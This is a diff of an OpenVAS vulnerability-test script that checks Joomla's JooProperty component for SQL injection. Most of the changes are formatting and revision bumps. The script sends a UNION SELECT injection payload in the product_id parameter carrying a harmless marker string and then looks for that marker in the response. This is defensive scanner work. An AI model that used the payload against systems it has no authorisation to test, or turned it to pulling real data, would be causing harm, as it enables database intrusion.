@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_joomla_56885.nasl 11325 2018-09-11 10:59:54Z asteins $
+# $Id: gb_joomla_56885.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # Joomla! JooProperty Component SQL Injection and Cross Site Scripting Vulnerabilities
 #
@@ -27,13 +27,13 @@
 
 CPE = "cpe:/a:joomla:joomla";
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103622");
   script_bugtraq_id(56885);
   script_tag(name:"cvss_base", value:"8.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");
-  script_version("$Revision: 11325 $");
+  script_version("$Revision: 11435 $");
 
   script_tag(name:"solution_type", value:"VendorFix");
 
@@ -42,7 +42,7 @@ if (description)
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56885");
   script_xref(name:"URL", value:"http://www.joomla.org");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-09-11 12:59:54 +0200 (Tue, 11 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-12-12 12:59:16 +0100 (Wed, 12 Dec 2012)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -61,7 +61,7 @@ compromise the application, access or modify data, or exploit latent vulnerabili
 
 JooProperty 1.13.0 is vulnerable, other versions may also be affected.");
 
- exit(0);
+  exit(0);
 }
 
 include("http_func.inc");
@@ -71,17 +71,16 @@ include("http_keepalive.inc");
 if(!port = get_app_port(cpe:CPE))exit(0);
 if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
 
-ex = '?option=com_jooproperty&view=booking&layout=modal&product_id=1%20and%201=0%20union%20select%20111111,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374+--';
+ex = '?option=com_jooproperty&view=booking&layout=modal&product_id=1%20and%201=0%20union%20select%20111111,0x53514c2d496e6a656374696f6e2d54657374+--';
 url = dir + '/' + ex;
 
-host = get_host_name();
+host = http_host_name(port:port);
 
-req = string("GET ",url," HTTP/1.1\r\n",
+req = string("GET ", url, " HTTP/1.1\r\n",
              "Host: ", host,"\r\n\r\n");
-
 result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
-if("Location" >< result && "OpenVAS-SQL-Injection-Test" >!< result) {
+if("Location" >< result && "SQL-Injection-Test" >!< result) {
 
   loc = eregmatch(pattern:"Location: (.*)/\?",string:result);
   if(loc[1]) {
@@ -93,13 +92,12 @@ if("Location" >< result && "OpenVAS-SQL-Injection-Test" >!< result) {
 
      req = string("GET ",url," HTTP/1.1\r\n",
                   "Host: ", host,"\r\n\r\n");
-
      result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    }
   }
 }
 
-if(result && "OpenVAS-SQL-Injection-Test" >< result) {
+if(result && "SQL-Injection-Test" >< result) {
   security_message(port:port);
   exit(0);
 }
